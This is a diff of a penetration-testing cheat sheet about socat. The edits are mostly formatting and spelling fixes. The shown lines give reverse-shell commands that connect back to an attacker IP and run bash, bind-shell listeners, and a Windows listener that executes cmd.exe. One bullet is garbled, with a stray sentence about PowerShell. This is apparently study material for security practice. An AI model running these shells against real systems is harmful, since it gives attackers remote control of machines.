@@ -2,7 +2,7 @@
 
 [Socat](https://linux.die.net/man/1/socat) is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features. 
 
-Socat requires:
+`socat` requires:
 1. "-" to transfer data between STDIO and remote host
 1. protocol name
 1. Any protocols, options, port ARE colon delimited
@@ -37,9 +37,8 @@ On Linux
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
 
-
-
 #### Bind Shells
+
 Start a bind listener
 ```bash
 socat TCP-L:<PORT> EXEC:"bash -li"
@@ -72,13 +71,13 @@ socat TCP4-LISTEN:$PORT,fork file:$filename
 ```bash
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
-1. pty, allocates a pseudoterminal on the target -- part of the stabation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toilisation process
-1. stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
-1. sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-1. setsid, creates the process in a new session
-1. sane, stabilises the terminal, attempting to "normalise" it
+1. `pty`, allocates a pseudo-terminal on the target -- part of the stabilisation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer stabilisation process
+1. `stderr`, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+1. `sigint`, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+1. `setsid`, creates the process in a new session
+1. `sane`, stabilises the terminal, attempting to "normalise" it
 
-Similiarly on Windows:
+Similarly on Windows:
 ```batch
 .\socat.exe TCP-LISTEN:443,fork EXEC:cmd.exe,pty,stderr,setsid,sigint,sane
 ```
